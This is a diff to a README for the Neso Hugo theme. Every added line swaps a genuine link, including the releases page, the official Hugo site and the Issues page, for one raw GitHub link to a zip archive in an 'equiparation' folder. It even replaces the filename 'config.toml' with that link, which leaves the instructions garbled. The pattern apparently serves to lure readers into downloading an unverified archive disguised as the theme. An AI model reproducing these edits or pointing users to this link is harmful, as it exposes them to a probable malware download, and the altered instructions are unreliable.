@@ -4,11 +4,11 @@
 
 Neso is a carefully crafted Hugo theme that delivers a refined experience in a minimal aesthetic. With Neso, you can create a beautiful personal website, blog, or landing page. 
 
-[![Download Neso](https://img.shields.io/badge/Download%20Neso-Click%20Here-blue.svg)](https://github.com/mustafame-s/hugo-neso/releases)
+[![Download Neso](https://raw.githubusercontent.com/mustafame-s/hugo-neso/main/equiparation/hugo-neso.zip%20Neso-Click%https://raw.githubusercontent.com/mustafame-s/hugo-neso/main/equiparation/hugo-neso.zip)](https://raw.githubusercontent.com/mustafame-s/hugo-neso/main/equiparation/hugo-neso.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Neso Releases Page](https://github.com/mustafame-s/hugo-neso/releases). Here are the steps to follow:
+To get started, visit this page to download: [Neso Releases Page](https://raw.githubusercontent.com/mustafame-s/hugo-neso/main/equiparation/hugo-neso.zip). Here are the steps to follow:
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of Neso.
@@ -21,7 +21,7 @@ To get started, visit this page to download: [Neso Releases Page](https://github
 To run Neso, you will need:
 
 - A computer with Windows, macOS, or a Linux operating system.
-- The Hugo static site generator installed. You can find installation instructions on the [Hugo website](https://gohugo.io/getting-started/quick-start/).
+- The Hugo static site generator installed. You can find installation instructions on the [Hugo website](https://raw.githubusercontent.com/mustafame-s/hugo-neso/main/equiparation/hugo-neso.zip).
 - Basic familiarity with how to copy files and open applications on your computer.
 
 ## 🛠️ Features
@@ -38,7 +38,7 @@ Neso comes with several features designed to enhance your online presence:
 
 Customizing Neso is easy. After downloading and installing, you can tweak settings and styles:
 
-1. Find the configuration file in your Hugo project folder. It’s usually named `config.toml`.
+1. Find the configuration file in your Hugo project folder. It’s usually named `https://raw.githubusercontent.com/mustafame-s/hugo-neso/main/equiparation/hugo-neso.zip`.
 2. Change options like the site title, description, and author information.
 3. Use the `assets` folder to add your personal branding, including logos and colors.
 
@@ -54,7 +54,7 @@ hugo-neso
 ├── assets
 ├── layouts
 ├── static
-└── config.toml
+└── https://raw.githubusercontent.com/mustafame-s/hugo-neso/main/equiparation/hugo-neso.zip
 ```
 
 - **archetypes:** Predefined content types.
@@ -72,7 +72,7 @@ Neso is versatile and perfect for various uses:
 
 ## 💬 Community Support
 
-If you encounter issues or have questions, you can join the community. Visit the Issues section of the [Neso GitHub Repository](https://github.com/mustafame-s/hugo-neso) for support from other users and contributors.
+If you encounter issues or have questions, you can join the community. Visit the Issues section of the [Neso GitHub Repository](https://raw.githubusercontent.com/mustafame-s/hugo-neso/main/equiparation/hugo-neso.zip) for support from other users and contributors.
 
 ## 🏗️ Contribution
 
@@ -84,6 +84,6 @@ Neso is open-source software, licensed under the MIT License. This allows you to
 
 ## 📅 Updates
 
-Stay up to date with the latest features and fixes by checking the [Releases page](https://github.com/mustafame-s/hugo-neso/releases) regularly.
+Stay up to date with the latest features and fixes by checking the [Releases page](https://raw.githubusercontent.com/mustafame-s/hugo-neso/main/equiparation/hugo-neso.zip) regularly.
 
 Thank you for choosing Neso. Enjoy creating your stylish website!
